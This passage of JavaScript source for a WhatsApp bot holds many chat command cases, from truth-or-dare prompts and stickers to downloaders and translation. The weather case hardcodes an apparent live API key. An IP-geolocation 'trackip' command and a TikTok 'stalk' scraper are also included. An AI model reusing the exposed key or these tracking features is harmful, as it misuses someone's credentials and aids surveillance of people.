    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Nobody?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              nØbødy.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
              case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
nØbødy.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
nØbødy.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    reply1(bibleChapter)
  } catch (error) {
    reply1(`Error: ${error.message}`)
  }
  }
  break
  case'tr':{
  	if (!q) return reply1reply1(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply1(result.text)
    } catch (e) {
        return reply1(err)
    } 
    }
    break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await nØbødy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
nØbødy.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return reply1(`Tag Someone, Example : ${prefix + command} @Nobody`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
nØbødy.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return reply1(`Tag Someone, Example : ${prefix + command} @Nobody`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
nØbødy.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return reply1(`Tag Someone, Example : ${prefix + command} @Nobody`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					nØbødy.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break


//End
//QC CASE

case 'qc': {
  if (!q) return reply1(`Send command with text. ${prefix + command} nØbødy`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await nØbødy.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  nØbødy.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
//Another 
case 'clearchat': {
await m.reply("Clearing...")
await sleep(1000) // wait for 1 second
await nØbødy.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
await m.reply("Chats Cleared") 
}
break
case "autosend": case "astatus": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.settings.send) return m.reply('Already on')
global.db.settings.send = true
m.reply('Autosend turned on successfully')
} else if (args[0] === "off") {
if (!global.db.settings.send) return m.reply('Already off')
global.db.settings.send = false
m.reply('Autosend turned off successfully')
}
}
break
case 'weather':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example('location'))
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           nØbødy.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
case 'mine': case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a sticker to steal"))   
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (m.pushName)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await nØbødy.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await nØbødy.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break
case 'trackip':
{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`112.90.150.204`))
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await nØbødy.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
await m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case "owner": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
await nØbødy.sendContact(m.chat, [`${botNumber}`], `Chat ${ownername}`, null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./supermedia/super.jpeg"), 
title: `© ${global.botname}`, 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${global.owner}`,
mediaType: 1
}}})
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!q) return m.reply(example(`Arch Md`))
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
nØbødy.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ѕυρєя м∂` }, { quoted: m })
}
break
case 'write': case 'ttp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
	   if (!text) return m.reply(example(`NOBODY`))
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'library/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: 'Arch Md ²⁵', // The pack name
		author: 'NOBODY', // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await nØbødy.sendMessage(m.chat,{sticker: nah},{quoted:m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
case 'alive': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
const aliveMsg = global.db.settings.alive || `Hi This is Super Md a bot created by Nobody deployed by ${ownername}\nto set your preffered alive message use ${prefix}setalive!`
m.reply(aliveMsg)
}
break
case 'mediafire': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!args[0]) return m.reply(example("https://www.mediafire.com/file/xxxxxxxxxx"))
if (!args[0].startsWith("https://")) return m.reply("please input a valid mediafire link")
await nØbødy.sendMessage(m.chat, {react: {text: '', key: m.key}})
try {
let url = args[0]
let api = await fetch(`https://api.agatz.xyz/api/mediafire?url=${url}`)
let res = await api.json()
let data = res.data[0]
let caption = `*MediaFire Downloader* -\n_Name: ${data.nama}_\n_Size: ${data.size}_\n_Extension: ${data.mime}_\n_Link: ${data.link}_`
await nØbødy.sendMessage(m.chat, { document: { url: data.link }, mimetype: data.mime, fileName: data.nama, caption: caption }, { quoted: m })
await nØbødy.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (error) {
console.log(error)
m.reply(error)
}
} 
break
case 'capcut': {
const fetch = require("node-fetch")
if (!text) return m.reply(`${prefix + command} https://www.capcut.com/template-detail/7442103570402446645?template_id=7442103570402446645&share_token=3ff5f0f9-40fc-43b4-8716-6097735e419a&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1`)
m.reply('Proses 🗿')
await fetch(`https://api.diioffc.web.id/api/download/capcut?url=${text}`).then(async (res) => {
let response = await res.json()
nØbødy.sendMessage(m.chat, { video: { url: response.result.url }, mimetype: 'video/mp4', caption: response.result.title }, { quoted: m })
}).catch(err => m.reply('Error 🗿'))
}
break
case 'sps':
case 'spotifys':
case 'spotifysearch':
case 'spotify': {
const fetch = require("node-fetch")
if (!text) return m.reply(`${prefix + command} untuk mencintaimu`)
m.reply('Proses 🗿')
await fetch(`https://api.diioffc.web.id/api/search/spotify?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian SPOTIFY*\n\n'
for (let i of response.result) {
teks += `*◦ Judul :* ${i.trackName}\n`
teks += `*◦ Artis :* ${i.artistName}\n`
teks += `*◦ Link Url :* ${i.externalUrl}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break
case 'status': {
    const baileys = require("@whiskeysockets/baileys");

    async function fetchParticipants(...jids) {
        let results = [];
        for (const jid of jids) {
            let { participants } = await nØbødy.groupMetadata(jid);
            participants = participants.map(({ id }) => id);
            results = results.concat(participants);
        }
        return results;
    }

    async function mentionStatus(jids, content) {
        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
            upload: nØbødy.waUploadToServer
        });

        let statusJidList = [];
        for (const _jid of jids) {
            if (_jid.endsWith("@g.us")) {
                for (const jid of await fetchParticipants(_jid)) {
                    statusJidList.push(jid);
                }
            } else {
                statusJidList.push(_jid);
            }
        }
        statusJidList = [...new Set(statusJidList)];

        await nØbødy.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        for (const jid of jids) {
            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
            await nØbødy.relayMessage(jid, {
                [type]: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        return msg;
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    let content = {};

    if (mime) {
        let media = await q.download();

        if (/image/.test(mime)) {
            content.image = media;
        } else if (/video/.test(mime)) {
            content.video = media;
        } else if (/audio/.test(mime)) {
            content.audio = media;
        } else {
            return m.reply("Jenis file tidak didukung!");
        }

        if (q.text) content.caption = q.text;
    } else if (args[0]) {
        let url = args[0];
        let type = args[1] || 'text';

        if (type === 'image') {
            content.image = { url };
        } else if (type === 'video') {
            content.video = { url };
        } else if (type === 'audio') {
            content.audio = { url };
        } else {
            content.text = args.slice(1).join(" ") || url;
        }
    } else {
        return m.reply("Reply media atau masukkan URL dengan format:\n.status <url> <image/video/audio/text>");
    }

    mentionStatus([m.chat], content).catch(console.error);
}
break;
case 'removebg': 
			case 'rmbg': {
				if (!DevOnly) return reply1('Owner Only');
				if (!isCreator) return reply1('Premuim Only');
				if (!mime) return reply1(`Send/Reply Image With Caption ${prefix + command}`);
				await reactionMessage('⏱️');
				try {
					let media = await nØbødy.downloadAndSaveMediaMessage(quoted);
					if (/image/.test(mime)) {
						let response = await CatBox(media);
						if(command == 'removebg') nØbødy.sendMessage(m.chat, {image:{url:'https://api.ryzendesu.vip/api/ai/removebg?url='+encodeURIComponent(response)}},{quoted:m});
						else if(command=='rmbg') {
							const rembg = await axios.get('https://api.zpi.my.id/v1/utility/bg-remover/image?url='+encodeURIComponent(response));
							nØbødy.sendMessage(m.chat, {image:{url:rembg.data.data.bg_removed}},{quoted:m});
						}
					} else {
						reply1(`Media type is not supported!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					reply1("Oops, something went wrong while uploading media. Please try again! 😅");
				}
			}
			break
case 'tiktokstalk': {
  const axios = require('axios');
  const cheerio = require('cheerio');

  async function tiktokStalk(username) {
    try {
      const response = await axios.get(`https://www.tiktok.com/@${username}?_t=ZS-8tHANz7ieoS&_r=1`);
      const html = response.data;
      const $ = cheerio.load(html);
      const scriptData = $('#__UNIVERSAL_DATA_FOR_REHYDRATION__').html();
      const parsedData = JSON.parse(scriptData);

      const userDetail = parsedData.__DEFAULT_SCOPE__?.['webapp.user-detail'];
      if (!userDetail) {
        throw new Error('user tidak ditemukan');
      }

      const userInfo = userDetail.userInfo?.user;
      const stats = userDetail.userInfo?.stats;

      const metadata = {
        userInfo: {
          id: userInfo?.id || null,
          username: userInfo?.uniqueId || null,
          nama: userInfo?.nickname || null,
          avatar: userInfo?.avatarLarger || null,
          bio: userInfo?.signature || null,
          verifikasi: userInfo?.verified || false,
          totalfollowers: stats?.followerCount || 0,
          totalmengikuti: stats?.followingCount || 0,
          totaldisukai: stats?.heart || 0,
          totalvideo: stats?.videoCount || 0,
          totalteman: stats?.friendCount || 0,
        }
      };

      return JSON.stringify(metadata, null, 2);
    } catch (error) {
      return error.message;
    }
  }

  const username = m.text.split(' ')[1];
  if (!username) {
    m.reply('Silakan masukkan username TikTok yang ingin Anda stalk');
  } else {
    const result = await tiktokStalk(username);
    m.reply(result);
  }
}
break;
case 'enc': case 'encrypt': {
    
    if (!DevOnly) return 

  if (!args[0]) return m.reply(`Please use ${prefix + command} usage`);
	

	
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
